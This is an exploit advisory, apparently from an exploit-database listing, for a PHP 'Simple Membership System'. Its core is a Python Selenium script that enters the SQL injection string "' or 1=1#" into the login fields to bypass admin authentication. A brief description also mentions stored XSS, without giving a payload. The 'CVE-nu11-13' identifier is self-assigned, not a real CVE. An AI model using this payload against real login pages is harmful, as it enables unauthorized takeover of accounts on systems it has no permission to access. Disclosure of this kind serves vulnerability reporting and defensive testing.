### Exploit Title: Simple Membership System using PHP and AJAX is vulnerable from remote SQL-Injection-Bypass-Authentication/XSS-Stored PWNED.
### Author: nu11secur1ty
### Testing and Debugging: nu11secur1ty 
### Date: 09.17.2021
### Vendor: https://www.sourcecodester.com/user/187830/activity
### Link: https://www.sourcecodester.com/php/11072/simple-membership-system.html
### CVE: CVE-nu11-13

[+] Exploit Source: 

#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug and Developement: @nu11secur1ty 
# CVE-nu11-13

from selenium import webdriver
import time
import os
from colorama import init, Fore, Back, Style
from selenium.webdriver.chrome.options import Options
init(convert=True)

victim="http://192.168.1.180/Simple%20Membership%20System/index.php"
browser = webdriver.Chrome()
browser.get((victim))
browser.maximize_window()

try:
	browser.execute_script("document.querySelector('[id=\"username\"]').value=\"nu11secur1ty' or 1=1#\"")
	browser.execute_script("document.querySelector('[id=\"password\"]').value=\"nu11secur1ty' or 1=1#\"")
	time.sleep(1)
	browser.execute_script("document.querySelector('[class=\"glyphicon glyphicon-log-in\"]').click()")
	
	print(Fore.RED + 'The payload for CVE-nu11-13 is deployed and your admin account is PWNED by SQL - Injection\n')
	print(Style.RESET_ALL)
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")


------------------------------------------------------------------

### Description:
The Simple Membership System using PHP and AJAX is vulnerable from remote SQL-Injection-Bypass-Authentication for the admin account/XSS-Stored PWNED.
remote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. 
The parameters (username and password) from the login form is not protected correctly and there is no security and escaping from malicious payloads. 
When the user will sending a malicious query or malicious payload to the MySQL server for login to the admin account on the system, 
he can bypass the login credentials and take control of this account. And the second time he can adding an payload by using XSS-Stored 

### BR 
- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer

-------------------------------------------------------------------
### Reproduce: 
### Proof: 
### BR nu11secur1ty
